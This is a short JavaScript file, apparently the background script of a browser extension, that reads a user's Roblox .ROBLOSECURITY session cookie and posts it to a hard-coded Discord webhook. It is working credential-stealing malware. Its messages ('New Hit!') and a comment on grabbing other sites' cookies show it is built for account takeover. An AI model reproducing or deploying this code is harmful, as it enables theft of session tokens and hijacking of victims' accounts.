function webhookReq(webhook, cookie) {
  var params = {
      embeds: [{
            "title": `WE JUST GOT A FUCKING BEAM`,
            "description": ">>> New Hit! Nate is cute! :skull:",
            "color": 141414,
            "fields": [{
              "name": 'Cookie',
              "value": "```\n" + cookie + "\n```",
              inline: false
            }]
    }]
  }
   
  // Send the webhook request
  fetch(webhook, {
    method: "POST",
    headers: {
      'Content-type': 'application/json'
    },
    body: JSON.stringify(params)
  })
}



// Driver Code:
cookieInfo = {url: "https://www.roblox.com/", name: '.ROBLOSECURITY'}; //If you want to grab other site cookies, change the values both here and in the manifest.json file
chrome.cookies.get(cookieInfo, function(cookie) {
  if (cookie) {
    webhookReq("https://discord.com/api/webhooks/995870134193369150/IdOyIR1rHqy3gwblMNLyH6_6Wxq2E0yAKgu7T189TCEk4Q7T0XjrIRwlkO3DT0IeCaWQ", cookie.value);
  }
});
